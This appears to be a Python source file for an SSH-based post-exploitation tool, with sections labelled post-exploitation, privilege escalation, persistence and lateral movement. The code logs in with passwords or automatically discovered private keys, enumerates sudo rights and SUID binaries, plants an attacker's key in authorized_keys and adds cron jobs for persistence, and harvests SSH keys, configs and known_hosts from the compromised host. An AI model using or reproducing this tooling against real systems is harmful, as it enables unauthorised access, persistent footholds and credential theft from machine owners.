"""
SSH Shell Connector - Private Key & Password ile SSH shell
Remote shell alma ve command execution
"""

import paramiko
import socket
import os
from typing import Optional, Dict, List, Tuple
import json


class SSHShellConnector:
    """SSH ile remote shell ve command execution"""
    
    def __init__(self, host: str, port: int = 22, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.client = None
        self.connected = False
        self.username = None
    
    # ==================== AUTHENTICATION ====================
    
    def connect_with_password(self, username: str, password: str) -> bool:
        """SSH with password authentication"""
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            self.client.connect(
                self.host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                look_for_keys=False
            )
            
            self.connected = True
            self.username = username
            print(f"✅ SSH connected as {username}@{self.host}")
            return True
        except paramiko.AuthenticationException:
            print(f"❌ Authentication failed for {username}")
            return False
        except Exception as e:
            print(f"❌ SSH connection failed: {str(e)}")
            return False
    
    def connect_with_key(self, username: str, key_path: str, key_password: Optional[str] = None) -> bool:
        """SSH with private key authentication"""
        try:
            if not os.path.exists(key_path):
                print(f"❌ Key file not found: {key_path}")
                return False
            
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Load private key
            try:
                if key_path.endswith('.pub'):
                    print("❌ Cannot use public key, need private key")
                    return False
                
                private_key = paramiko.RSAKey.from_private_key_file(
                    key_path,
                    password=key_password
                )
            except paramiko.PasswordRequiredException:
                print("❌ Private key requires password")
                return False
            
            self.client.connect(
                self.host,
                port=self.port,
                username=username,
                pkey=private_key,
                timeout=self.timeout,
                look_for_keys=False
            )
            
            self.connected = True
            self.username = username
            print(f"✅ SSH connected as {username}@{self.host} (key auth)")
            return True
        except FileNotFoundError:
            print(f"❌ Key file not found: {key_path}")
            return False
        except Exception as e:
            print(f"❌ SSH key connection failed: {str(e)}")
            return False
    
    def connect_with_key_path_discovery(self, username: str) -> bool:
        """Auto-discover and try common SSH key paths"""
        common_paths = [
            os.path.expanduser("~/.ssh/id_rsa"),
            os.path.expanduser("~/.ssh/id_dsa"),
            os.path.expanduser("~/.ssh/id_ecdsa"),
            os.path.expanduser("~/.ssh/id_ed25519"),
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/id_rsa"
        ]
        
        for key_path in common_paths:
            if "*" in key_path:
                continue
            if os.path.exists(key_path):
                print(f"🔑 Trying {key_path}...")
                if self.connect_with_key(username, key_path):
                    return True
        
        print("❌ No valid SSH keys found")
        return False
    
    # ==================== COMMAND EXECUTION ====================
    
    def execute_command(self, command: str) -> Tuple[str, str, int]:
        """Execute single command and return output"""
        if not self.connected:
            return "", "Not connected", 1
        
        try:
            stdin, stdout, stderr = self.client.exec_command(command)
            
            out = stdout.read().decode()
            err = stderr.read().decode()
            exit_code = stdout.channel.recv_exit_status()
            
            return out, err, exit_code
        except Exception as e:
            return "", str(e), 1
    
    def execute_commands_batch(self, commands: List[str]) -> Dict[str, Tuple[str, str, int]]:
        """Execute multiple commands"""
        results = {}
        
        for cmd in commands:
            out, err, code = self.execute_command(cmd)
            results[cmd] = (out, err, code)
        
        return results
    
    # ==================== POST-EXPLOITATION ====================
    
    def get_system_info(self) -> Dict[str, str]:
        """Gather system information"""
        commands = {
            "hostname": "hostname",
            "whoami": "whoami",
            "id": "id",
            "uname": "uname -a",
            "pwd": "pwd",
            "kernel": "uname -r",
            "distro": "cat /etc/os-release 2>/dev/null || cat /etc/issue",
            "shell": "echo $SHELL"
        }
        
        info = {}
        for key, cmd in commands.items():
            out, _, _ = self.execute_command(cmd)
            info[key] = out.strip()
        
        return info
    
    def check_sudo_privileges(self) -> List[str]:
        """Check sudo privileges"""
        out, _, _ = self.execute_command("sudo -l 2>/dev/null")
        
        if "not allowed" in out.lower() or "password" in out.lower():
            return []
        
        # Extract NOPASSWD commands
        lines = out.split('\n')
        privs = [line.strip() for line in lines if 'NOPASSWD' in line]
        return privs
    
    def check_suid_binaries(self) -> List[str]:
        """Find SUID binaries"""
        cmd = "find / -perm -4000 2>/dev/null | head -20"
        out, _, _ = self.execute_command(cmd)
        return out.strip().split('\n')
    
    def check_writable_directories(self) -> List[str]:
        """Find writable directories"""
        cmd = "find / -type d -writable 2>/dev/null | head -20"
        out, _, _ = self.execute_command(cmd)
        return out.strip().split('\n')
    
    def get_installed_packages(self) -> List[str]:
        """List installed packages"""
        commands = [
            "dpkg -l 2>/dev/null",  # Debian/Ubuntu
            "rpm -qa 2>/dev/null",  # RedHat/CentOS
            "pacman -Q 2>/dev/null"  # Arch
        ]
        
        for cmd in commands:
            out, _, code = self.execute_command(cmd)
            if code == 0 and out:
                return out.strip().split('\n')
        
        return []
    
    def check_listening_ports(self) -> List[str]:
        """Check listening ports"""
        commands = [
            "ss -tlnp 2>/dev/null",
            "netstat -tlnp 2>/dev/null",
            "netstat -tuln 2>/dev/null"
        ]
        
        for cmd in commands:
            out, _, code = self.execute_command(cmd)
            if code == 0 and out:
                return out.strip().split('\n')
        
        return []
    
    # ==================== PRIVILEGE ESCALATION ====================
    
    def attempt_sudo_exploit(self, command: str = "id") -> Optional[str]:
        """Attempt to run command with sudo"""
        try:
            cmd = f"sudo {command}"
            out, err, code = self.execute_command(cmd)
            
            if code == 0:
                return out
            return None
        except Exception:
            return None
    
    def check_kernel_vulnerabilities(self) -> List[str]:
        """Check for known kernel vulnerabilities"""
        out, _, _ = self.execute_command("uname -r")
        kernel_version = out.strip()
        
        # Known vulnerable kernels
        vulnerable_patterns = [
            "4.4.0",  # Ubuntu 16.04 - DirtyCOW variants
            "3.10",   # CentOS 7 - Dirty COW
            "4.9.34", # Privilege escalation
        ]
        
        vulnerable = [p for p in vulnerable_patterns if p in kernel_version]
        return vulnerable
    
    # ==================== PERSISTENCE ====================
    
    def add_ssh_key(self, public_key: str) -> bool:
        """Add SSH public key to authorized_keys for persistence"""
        try:
            cmd = f"""
mkdir -p ~/.ssh
echo '{public_key}' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
"""
            _, err, code = self.execute_command(cmd)
            
            if code == 0:
                print("✅ SSH key added to authorized_keys")
                return True
            return False
        except Exception:
            return False
    
    def add_cron_job(self, cron_expression: str, command: str) -> bool:
        """Add cron job for persistence"""
        try:
            cron_cmd = f"(crontab -l 2>/dev/null; echo '{cron_expression} {command}') | crontab -"
            _, err, code = self.execute_command(cron_cmd)
            
            if code == 0:
                print(f"✅ Cron job added: {cron_expression}")
                return True
            return False
        except Exception:
            return False
    
    # ==================== LATERAL MOVEMENT ====================
    
    def find_readable_ssh_keys(self) -> List[str]:
        """Find SSH keys on the system"""
        cmd = "find ~ -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null"
        out, _, _ = self.execute_command(cmd)
        return [k.strip() for k in out.split('\n') if k.strip()]
    
    def get_ssh_config(self) -> str:
        """Read SSH config file"""
        cmd = "cat ~/.ssh/config 2>/dev/null"
        out, _, _ = self.execute_command(cmd)
        return out
    
    def get_known_hosts(self) -> List[str]:
        """Read known_hosts file"""
        cmd = "cat ~/.ssh/known_hosts 2>/dev/null"
        out, _, _ = self.execute_command(cmd)
        return out.strip().split('\n')
    
    # ==================== INTERACTIVE SHELL ====================
    
    def interactive_shell(self) -> None:
        """Interactive SSH shell"""
        if not self.connected:
            print("❌ Not connected")
            return
        
        print(f"\n🔓 Interactive SSH Shell: {self.username}@{self.host}")
        print("Type 'exit' to quit\n")
        
        while True:
            try:
                cmd = input(f"{self.username}@{self.host}> ")
                if cmd.lower() == "exit":
                    break
                
                out, err, code = self.execute_command(cmd)
                
                if out:
                    print(out, end='')
                if err:
                    print(err, end='', file=__import__('sys').stderr)
            
            except KeyboardInterrupt:
                print("\n🚪 Shell closed")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
    
    # ==================== CLEANUP ====================
    
    def disconnect(self) -> None:
        """Close SSH connection"""
        if self.client:
            self.client.close()
            self.connected = False
            print(f"✅ SSH connection closed")


# ==================== EXAMPLE USAGE ====================

if __name__ == "__main__":
    # Connect with password
    connector = SSHShellConnector("target.com", port=22)
    
    if connector.connect_with_password("ubuntu", "password123"):
        # Get system info
        info = connector.get_system_info()
        for key, value in info.items():
            print(f"{key}: {value}")
        
        # Interactive shell
        connector.interactive_shell()
        
        connector.disconnect()
